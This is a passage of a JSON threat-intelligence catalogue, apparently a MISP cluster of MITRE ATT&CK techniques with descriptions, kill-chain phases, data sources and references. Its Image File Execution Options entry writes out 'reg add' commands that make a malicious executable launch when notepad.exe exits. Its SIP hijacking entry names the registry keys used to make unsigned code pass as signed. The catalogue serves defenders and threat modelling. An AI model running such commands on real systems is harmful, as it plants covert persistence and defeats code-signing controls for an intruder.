        "external_id": "T1410",
        "kill_chain": [
          "mitre-mobile-attack:collection",
          "mitre-mobile-attack:credential-access"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1410",
          "https://www.skycure.com/blog/malicious-profiles-the-sleeping-giant-of-ios-security/"
        ]
      },
      "uuid": "3b0b604f-10db-41a0-b54c-493124d455b9",
      "value": "Network Traffic Capture or Redirection - T1410"
    },
    {
      "description": "Infrastructure services includes the hardware, software, and network resources required to operate a communications environment. This infrastructure can be managed by a 3rd party rather than being managed by the owning organization. (Citation: FFIECAwareness) (Citation: Zetter2015Threats)",
      "meta": {
        "external_id": "T1260",
        "kill_chain": [
          "mitre-pre-attack:technical-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1260"
        ]
      },
      "related": [
        {
          "dest-uuid": "dfa4eaf4-50d9-49de-89e9-d33f579f3e05",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "856a9371-4f0f-4ea9-946e-f3144204240f",
      "value": "Determine 3rd party infrastructure services - T1260"
    },
    {
      "description": "Outsourcing, the arrangement of one company providing goods or services to another company for something that could be done in-house, provides another avenue for an adversary to target. Businesses often have networks, portals, or other technical connections between themselves and their outsourced/partner organizations that could be exploited. Additionally, outsourced/partner organization information could provide opportunities for phishing. (Citation: Scasny2015) (Citation: OPM Breach)",
      "meta": {
        "external_id": "T1303",
        "kill_chain": [
          "mitre-pre-attack:organizational-weakness-identification"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1303"
        ]
      },
      "uuid": "34450117-d1d5-417c-bb74-4359fc6551ca",
      "value": "Analyze presence of outsourced capabilities - T1303"
    },
    {
      "description": "Adversaries may access data objects from improperly secured cloud storage.\n\nMany cloud service providers offer solutions for online data storage such as Amazon S3, Azure Storage, and Google Cloud Storage. These solutions differ from other storage solutions (such as SQL or Elasticsearch) in that there is no overarching application. Data from these solutions can be retrieved directly using the cloud provider's APIs. Solution providers typically offer security guides to help end users configure systems.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019)\n\nMisconfiguration by end users is a common problem. There have been numerous incidents where cloud storage has been improperly secured (typically by unintentionally allowing public access by unauthenticated users or overly-broad access by all users), allowing open access to credit cards, personally identifiable information, medical records, and other sensitive information.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017) Adversaries may also obtain leaked credentials in source repositories, logs, or other means as a way to gain access to cloud storage objects that have access permission controls.",
      "meta": {
        "external_id": "T1530",
        "kill_chain": [
          "mitre-attack:collection"
        ],
        "mitre_data_sources": [
          "Stackdriver logs",
          "Azure activity logs",
          "AWS CloudTrail logs"
        ],
        "mitre_platforms": [
          "AWS",
          "GCP",
          "Azure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1530",
          "https://aws.amazon.com/premiumsupport/knowledge-center/secure-s3-resources/",
          "https://docs.microsoft.com/en-us/azure/storage/common/storage-security-guide",
          "https://cloud.google.com/storage/docs/best-practices",
          "https://www.trendmicro.com/vinfo/us/security/news/virtualization-and-cloud/a-misconfigured-amazon-s3-exposed-almost-50-thousand-pii-in-australia",
          "https://www.wired.com/story/magecart-amazon-cloud-hacks/",
          "https://www.hipaajournal.com/47gb-medical-records-unsecured-amazon-s3-bucket/"
        ]
      },
      "uuid": "3298ce88-1628-43b1-87d9-0b5336b193d7",
      "value": "Data from Cloud Storage Object - T1530"
    },
    {
      "description": "Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration.\n\nAdversaries may search network shares on computers they have compromised to find files of interest. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information.",
      "meta": {
        "external_id": "T1039",
        "kill_chain": [
          "mitre-attack:collection"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1039"
        ]
      },
      "uuid": "ae676644-d2d2-41b7-af7e-9bed1b55898c",
      "value": "Data from Network Shared Drive - T1039"
    },
    {
      "description": "An app could download and execute dynamic code (not included in the original application package) after installation to evade static analysis techniques (and potentially dynamic analysis techniques) used for application vetting or application store review.(Citation: Poeplau-ExecuteThis)\n\nOn Android, dynamic code could include native code, Dalvik code, or JavaScript code that uses the Android WebView's JavascriptInterface capability.(Citation: Bromium-AndroidRCE)\n\nOn iOS, techniques also exist for executing dynamic code downloaded after application installation.(Citation: FireEye-JSPatch)(Citation: Wang)",
      "meta": {
        "external_id": "APP-20",
        "kill_chain": [
          "mitre-mobile-attack:defense-evasion"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1407",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-20.html",
          "https://www.internetsociety.org/sites/default/files/10_5_0.pdf",
          "https://labs.bromium.com/2014/07/31/remote-code-execution-on-android-devices/",
          "https://www.fireeye.com/blog/threat-research/2016/01/hot_or_not_the_bene.html",
          "https://www.usenix.org/conference/usenixsecurity13/technical-sessions/presentation/wang_tielei"
        ]
      },
      "uuid": "6c49d50f-494d-4150-b774-a655022d20a6",
      "value": "Download New Code at Runtime - T1407"
    },
    {
      "description": "Windows Management Instrumentation (WMI) can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. Adversaries may attempt to evade detection of this technique by compiling WMI scripts into Windows Management Object (MOF) files (.mof extension). (Citation: Dell WMI Persistence) Examples of events that may be subscribed to are the wall clock time or the computer's uptime. (Citation: Kazanciyan 2014) Several threat groups have reportedly used this technique to maintain persistence. (Citation: Mandiant M-Trends 2015)",
      "meta": {
        "external_id": "T1084",
        "kill_chain": [
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "WMI Objects"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1084",
          "https://www.secureworks.com/blog/wmi-persistence",
          "https://www.defcon.org/images/defcon-22/dc-22-presentations/Kazanciyan-Hastings/DEFCON-22-Ryan-Kazanciyan-Matt-Hastings-Investigating-Powershell-Attacks.pdf",
          "https://www2.fireeye.com/rs/fireye/images/rpt-m-trends-2015.pdf",
          "https://technet.microsoft.com/en-us/sysinternals/bb963902",
          "https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96"
        ]
      },
      "uuid": "e906ae4d-1d3a-4675-be23-22f7311c0da4",
      "value": "Windows Management Instrumentation Event Subscription - T1084"
    },
    {
      "description": "Adversaries may communicate using a custom command and control protocol instead of encapsulating commands/data in an existing [Standard Application Layer Protocol](https://attack.mitre.org/techniques/T1071). Implementations include mimicking well-known protocols or developing custom protocols (including raw sockets) on top of fundamental protocols provided by TCP/IP/another standard network stack.",
      "meta": {
        "external_id": "T1094",
        "kill_chain": [
          "mitre-attack:command-and-control"
        ],
        "mitre_data_sources": [
          "Packet capture",
          "Netflow/Enclave netflow",
          "Process use of network",
          "Process monitoring",
          "Host network interface",
          "Network intrusion detection system",
          "Network protocol analysis"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1094",
          "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
        ]
      },
      "uuid": "f72eb8a8-cd4c-461d-a814-3f862befbf00",
      "value": "Custom Command and Control Protocol - T1094"
    },
    {
      "description": "The application is downloaded from an arbitrary web site. A link to the application's download URI may be sent in an email or SMS, placed on another web site that the target is likely to view, or sent via other means (such as QR code).\n\nDetection: An EMM/MDM or mobile threat protection solution can identify the presence of unwanted, known insecure, or malicious apps on devices.\n\nPlatforms: Android, iOS",
      "meta": {
        "external_id": "T1431",
        "refs": [
          "https://attack.mitre.org/techniques/T1431"
        ]
      },
      "related": [
        {
          "dest-uuid": "53263a67-075e-48fa-974b-91c5b5445db7",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "revoked-by"
        }
      ],
      "uuid": "6b846ad0-cc20-4db6-aa34-91561397c5e2",
      "value": "App Delivered via Web Download - T1431"
    },
    {
      "description": "Image File Execution Options (IFEO) enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., “C:\\dbg\\ntsd.exe -g  notepad.exe”). (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable></code> where <code><executable></code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IEFO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)\n\nAn example where the evil.exe process is started when notepad.exe exits: (Citation: Oddvar Moe IFEO APR 2018)\n\n* <code>reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\" /v GlobalFlag /t REG_DWORD /d 512</code>\n* <code>reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v ReportingMode /t REG_DWORD /d 1</code>\n* <code>reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v MonitorProcess /d \"C:\\temp\\evil.exe\"</code>\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may be abused to obtain persistence and privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Endgame Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous invocation.\n\nMalware may also use IFEO for Defense Evasion by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)",
      "meta": {
        "external_id": "T1183",
        "kill_chain": [
          "mitre-attack:privilege-escalation",
          "mitre-attack:persistence",
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "Process monitoring",
          "Windows Registry",
          "Windows event logs"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1183",
          "https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/",
          "https://docs.microsoft.com/windows-hardware/drivers/debugger/gflags-overview",
          "https://www.f-secure.com/v-descs/backdoor_w32_hupigon_emv.shtml",
          "https://www.symantec.com/security_response/writeup.jsp?docid=2008-062807-2501-99&tabid=2",
          "https://docs.microsoft.com/windows-hardware/drivers/debugger/registry-entries-for-silent-process-exit",
          "https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/",
          "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process"
        ]
      },
      "uuid": "62166220-e498-410f-a90a-19d4339d4e99",
      "value": "Image File Execution Options Injection - T1183"
    },
    {
      "description": "In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  (Citation: Microsoft WinVerifyTrust) which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017)\n\nBecause of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  (Citation: Microsoft Catalog Files and Signatures April 2017)) and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)\n\nSimilar to [Code Signing](https://attack.mitre.org/techniques/T1116), adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and whitelisting tools to classify malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)\n\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE[\\WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}</code> that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value all files using that SIP (Citation: GitHub SIP POC Sept 2017) (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}</code> that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.\n* Modifying the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{trust provider GUID}</code> that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).\n* **Note:** The above hijacks are also possible without modifying the Registry via [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038).\n\nHijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. (Citation: SpectorOps Subverting Trust Sept 2017)",
      "meta": {
        "external_id": "T1198",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "API monitoring",
          "Application logs",
          "DLL monitoring",
          "Loaded DLLs",
          "Process monitoring",
          "Windows Registry",
          "Windows event logs"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1198",
          "https://msdn.microsoft.com/library/ms537359.aspx",
          "https://msdn.microsoft.com/library/windows/desktop/aa388208.aspx",
          "https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf",
          "https://blogs.technet.microsoft.com/eduardonavarro/2008/07/11/sips-subject-interface-package-and-authenticode/",
          "https://docs.microsoft.com/windows-hardware/drivers/install/catalog-files",
          "https://github.com/mattifestation/PoCSubjectInterfacePackage",
          "http://www.entrust.net/knowledge-base/technote.cfm?tn=8165",
          "https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn311461(v=ws.11)",
          "https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd941614(v=ws.10)"
        ]
      },
      "uuid": "72b5ef57-325c-411b-93ca-a3ca6fa17e31",
      "value": "SIP and Trust Provider Hijacking - T1198"
    },
    {
      "description": "File and directory permissions are commonly managed by discretionary access control lists (DACLs) specified by the file or directory owner. File and directory DACL implementations may vary by platform, but generally explicitly designate which users/groups can perform which actions (ex: read, write, execute, etc.). (Citation: Microsoft DACL May 2018) (Citation: Microsoft File Rights May 2018) (Citation: Unix File Permissions)\n\nAdversaries may modify file or directory permissions/attributes to evade intended DACLs. (Citation: Hybrid Analysis Icacls1 June 2018) (Citation: Hybrid Analysis Icacls2 May 2018) Modifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions such as Administrator/root depending on the file or directory's existing permissions to enable malicious activity such as modifying, replacing, or deleting specific files/directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1015), [Logon Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files.",
      "meta": {
        "external_id": "T1222",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring",
          "Process command-line parameters",
          "Windows event logs"
        ],
        "mitre_platforms": [
          "Linux",
          "Windows",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1222",
          "https://docs.microsoft.com/windows/desktop/secauthz/dacls-and-aces",
          "https://docs.microsoft.com/windows/desktop/fileio/file-security-and-access-rights",
          "https://www.tutorialspoint.com/unix/unix-file-permission.htm",
          "https://www.hybrid-analysis.com/sample/ef0d2628823e8e0a0de3b08b8eacaf41cf284c086a948bdfd67f4e4373c14e4d?environmentId=100",
          "https://www.hybrid-analysis.com/sample/22dab012c3e20e3d9291bce14a2bfc448036d3b966c6e78167f4626f5f9e38d6?environmentId=110",
          "https://docs.microsoft.com/windows-server/administration/windows-commands/icacls",
          "https://docs.microsoft.com/windows-server/administration/windows-commands/takeown",
          "https://docs.microsoft.com/windows-server/administration/windows-commands/attrib",
          "https://docs.microsoft.com/powershell/module/microsoft.powershell.security/set-acl",
          "https://linux.die.net/man/1/chmod",
          "https://linux.die.net/man/1/chown",
          "https://www.eventtracker.com/tech-articles/monitoring-file-permission-changes-windows-security-log/"
        ]
      },
      "uuid": "65917ae0-b854-4139-83fe-bf2441cf0196",
      "value": "File and Directory Permissions Modification - T1222"
    },
    {
      "description": "Leadership assesses the areas of most interest to them and generates Key Intelligence Topics (KIT) or Key Intelligence Questions (KIQ). For example, an adversary knows from open and closed source reporting that cyber is of interest, resulting in it being a KIT. (Citation: ODNIIntegration)",
      "meta": {
        "external_id": "T1224",
        "kill_chain": [
          "mitre-pre-attack:priority-definition-planning"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1224"
        ]
      },
      "uuid": "d3999268-740f-467e-a075-c82e2d04be62",
      "value": "Assess leadership areas of interest - T1224"
    },
    {
      "description": "A wide variety of cloud, virtual private services, hosting, compute, and storage solutions are available as 3rd party infrastructure services. These services could provide an adversary with another avenue of approach or compromise. (Citation: LUCKYCAT2012) (Citation: Schneier-cloud) (Citation: Computerworld-suppliers)",
      "meta": {
        "external_id": "T1284",
        "kill_chain": [
          "mitre-pre-attack:organizational-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1284"
        ]
      },
      "related": [
        {
          "dest-uuid": "856a9371-4f0f-4ea9-946e-f3144204240f",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "dfa4eaf4-50d9-49de-89e9-d33f579f3e05",
      "value": "Determine 3rd party infrastructure services - T1284"
    },
    {
      "description": "From a tactical viewpoint, an adversary could potentially have a primary and secondary level target.  The primary target represents the highest level tactical element the adversary wishes to attack.  For example, the corporate network within a corporation or the division within an agency. (Citation: CyberAdversaryBehavior) (Citation: JP3-60) (Citation: JP3-12R) (Citation: DoD Cyber 2015)",
      "meta": {
        "external_id": "T1243",
        "kill_chain": [
          "mitre-pre-attack:target-selection"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1243"
        ]
      },
      "uuid": "dc7dfc9f-be1b-4e6e-a2e6-9a9bb2400ec9",
      "value": "Determine highest level tactical element - T1243"
    },
    {
      "description": "The secondary level tactical element the adversary seeks to attack is the specific network or area of a network that is vulnerable to attack.  Within the corporate network example, the secondary level tactical element might be a SQL server or a domain controller with a known vulnerability. (Citation: CyberAdversaryBehavior) (Citation: JP3-60) (Citation: JP3-12R) (Citation: DoD Cyber 2015)",
      "meta": {
        "external_id": "T1244",
        "kill_chain": [
          "mitre-pre-attack:target-selection"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1244"
        ]
      },
      "uuid": "b9148981-152a-4a19-95c1-962803f5c9af",
      "value": "Determine secondary level tactical element - T1244"
    },
    {
      "description": "With escalated privileges, an adversary could program the mobile device to impersonate USB devices such as input devices (keyboard and mouse), storage devices, and/or networking devices in order to attack a physically connected PC(Citation: Wang-ExploitingUSB)(Citation: ArsTechnica-PoisonTap) This technique has been demonstrated on Android. We are unaware of any demonstrations on iOS.",
      "meta": {
        "external_id": "PHY-2",
        "kill_chain": [
          "mitre-mobile-attack:lateral-movement"
        ],
        "mitre_platforms": [
          "Android"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1427",
          "https://pages.nist.gov/mobile-threat-catalogue/physical-threats/PHY-2.html",
          "http://dl.acm.org/citation.cfm?id=1920314",
          "http://arstechnica.com/security/2016/11/meet-poisontap-the-5-tool-that-ransacks-password-protected-computers/"
        ]
      },
      "uuid": "a0464539-e1b7-4455-a355-12495987c300",
      "value": "Attack PC via USB Connection - T1427"
    },
    {
      "description": "Determining if a \"corporate\" help desk exists, the degree of access and control it has, and whether there are \"edge\" units that may have different support processes and standards. (Citation: SANSCentratlizeManagement)",
      "meta": {
        "external_id": "T1285",
        "kill_chain": [
          "mitre-pre-attack:organizational-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1285"
        ]
      },
      "uuid": "a7dff5d5-99f9-4a7e-ac54-a64113c28121",
      "value": "Determine centralization of IT management - T1285"
    },
    {
      "description": "Network trusts enable communications between different networks with specific accesses and permissions. Network trusts could include the implementation of domain trusts or the use of virtual private networks (VPNs). (Citation: CuckoosEgg) (Citation: CuckoosEggWikipedia) (Citation: KGBComputerMe)",
      "meta": {
        "external_id": "T1259",
        "kill_chain": [
          "mitre-pre-attack:technical-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1259"
        ]
      },
      "uuid": "a2fc93cd-e371-4755-9305-2615b6753d91",
      "value": "Determine external network trust dependencies - T1259"
    },
    {
      "description": "Understanding organizational skillsets and deficiencies could provide insight in to weakness in defenses, or opportunities for exploitation. (Citation: FakeLinkedIn)",
      "meta": {
        "external_id": "T1297",
        "kill_chain": [
          "mitre-pre-attack:people-weakness-identification"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1297"
        ]
      },
      "related": [
        {
          "dest-uuid": "7baccb84-356c-4e89-8c5d-58e701f033fc",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        },
        {
          "dest-uuid": "092f05e3-f7c0-4cd2-91be-3a8d6ed3cadc",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "96eb59d1-6c46-44bb-bfcd-56be02a00d41",
      "value": "Analyze organizational skillsets and deficiencies - T1297"
    },
    {
      "description": "An adversary may analyze technical scanning results to identify weaknesses in the configuration or architecture of a victim network. These weaknesses could include  architectural flaws, misconfigurations, or improper security controls. (Citation: FireEyeAPT28)",
      "meta": {
        "external_id": "T1288",
        "kill_chain": [
          "mitre-pre-attack:technical-weakness-identification"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1288"
        ]
      },
      "uuid": "87775365-2081-4b6e-99bd-48a3b8f36563",
      "value": "Analyze architecture and configuration posture - T1288"
    },
    {
      "description": "Analyze strengths and weaknesses of the target for potential areas of where to focus compromise efforts. (Citation: FakeLinkedIn)",
      "meta": {
        "external_id": "T1289",
        "kill_chain": [
          "mitre-pre-attack:technical-weakness-identification"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1289"
        ]
      },
      "related": [
        {
          "dest-uuid": "96eb59d1-6c46-44bb-bfcd-56be02a00d41",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        },
        {
          "dest-uuid": "7baccb84-356c-4e89-8c5d-58e701f033fc",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "092f05e3-f7c0-4cd2-91be-3a8d6ed3cadc",
      "value": "Analyze organizational skillsets and deficiencies - T1289"
    },
    {
      "description": "This technique has been deprecated. Please see ATT&CK's Initial Access and Execution tactics for replacement techniques.\n\nThe utilization of resources not owned by the adversary to launch exploits or operations. This includes utilizing equipment that was previously compromised or leveraging access  gained by other methods (such as compromising an employee at a business partner location). (Citation: CitizenLabGreatCannon)",
      "meta": {
        "external_id": "T1375",
        "kill_chain": [
          "mitre-pre-attack:launch"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1375"
        ]
      },
      "uuid": "2c8a9df4-52a9-4770-94b3-5e95ab7d59f9",
      "value": "Leverage compromised 3rd party resources - T1375"
    },
    {
      "description": "An adversary will require some physical hardware and software. They may only need a lightweight set-up if most of their activities will take place using on-line infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems. (Citation: NYTStuxnet)",
      "meta": {
        "external_id": "T1335",
        "kill_chain": [
          "mitre-pre-attack:establish-&-maintain-infrastructure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1335"
        ]
      },
      "uuid": "2141aea0-cf38-49aa-9e51-ac34092bc30a",
      "value": "Procure required equipment and software - T1335"
    },
    {
      "description": "Certificates are designed to instill trust. They  include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. Acquiring a certificate for a  domain name similar to one that is expected to be trusted may allow an adversary to trick a user in to trusting the domain (e.g., vvachovia instead of [Wachovia](https://www.wellsfargo.com/about/corporate/wachovia) -- homoglyphs). (Citation: SubvertSSL) (Citation: PaypalScam)",
      "meta": {
        "external_id": "T1337",
        "kill_chain": [
          "mitre-pre-attack:establish-&-maintain-infrastructure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1337"
        ]
      },
      "uuid": "e34b9ca1-8778-41a3-bba5-8edaab4076dc",
      "value": "SSL certificate acquisition for domain - T1337"
    },
    {
      "description": "This technique has been deprecated. Please see ATT&CK's Initial Access and Execution tactics for replacement techniques.\n\nUpon successful compromise the adversary may implement methods for confirming success including communication to a command and control server, exfiltration of data, or a verifiable intended effect such as a publicly accessible resource being inaccessible or a web page being defaced. (Citation: FireEye Malware Stages) (Citation: APTNetworkTrafficAnalysis)",
      "meta": {
        "external_id": "T1383",
        "kill_chain": [
          "mitre-pre-attack:compromise"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1383"
        ]
      },
      "uuid": "f4c5d1d9-8f0e-46f1-a9fa-f9a440926046",
      "value": "Confirmation of launched compromise achieved - T1383"
    },
    {
      "description": "The application is delivered as an email attachment.\n\nDetection: An EMM/MDM or mobile threat protection solution can identify the presence of unwanted, known insecure, or malicious apps on devices. Enterprise email security solutions can identify the presence of Android or iOS application packages within email messages.\n\nPlatforms: Android, iOS",
      "meta": {
        "external_id": "T1434",
        "refs": [
          "https://attack.mitre.org/techniques/T1434"
        ]
      },
      "related": [
        {
          "dest-uuid": "53263a67-075e-48fa-974b-91c5b5445db7",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "revoked-by"
        }
      ],
      "uuid": "1f96d624-8409-4472-ad8a-30618ee6b2e2",
      "value": "App Delivered via Email Attachment - T1434"
    },
    {
      "description": "Delivery systems are the infrastructure used by the adversary to host malware or other tools used during exploitation. Building and configuring delivery systems may include multiple activities such as registering domain names, renting hosting space, or configuring previously exploited environments. (Citation: APT1)",
      "meta": {
        "external_id": "T1347",
        "kill_chain": [
          "mitre-pre-attack:build-capabilities"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1347"
        ]
      },
      "uuid": "15ef4da5-3b93-4bb1-a39a-5396661956d3",
      "value": "Build and configure delivery systems - T1347"
    },
    {
      "description": "This technique has been deprecated. Please see ATT&CK's Initial Access and Execution tactics for replacement techniques.\n\nUsers may be performing legitimate activity but using media that is compromised (e.g., using a USB drive that comes with malware installed during manufacture or supply). Upon insertion in the system the media auto-runs and the malware executes without further action by the user. (Citation: WSUSpect2015)",
      "meta": {
        "external_id": "T1384",
        "kill_chain": [
          "mitre-pre-attack:compromise"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1384"
        ]
      },
      "uuid": "0e6abb17-0f81-4988-9fd2-4ba0b673d729",
      "value": "Automated system performs requested action - T1384"
    },
    {
      "description": "If network traffic between the mobile device and remote servers is unencrypted or is encrypted in an insecure manner, then an adversary positioned on the network can eavesdrop on communication.(Citation: mHealth)",
      "meta": {
        "external_id": "APP-1",
        "kill_chain": [
          "mitre-mobile-attack:network-effects"
        ],
        "mitre_platforms": [
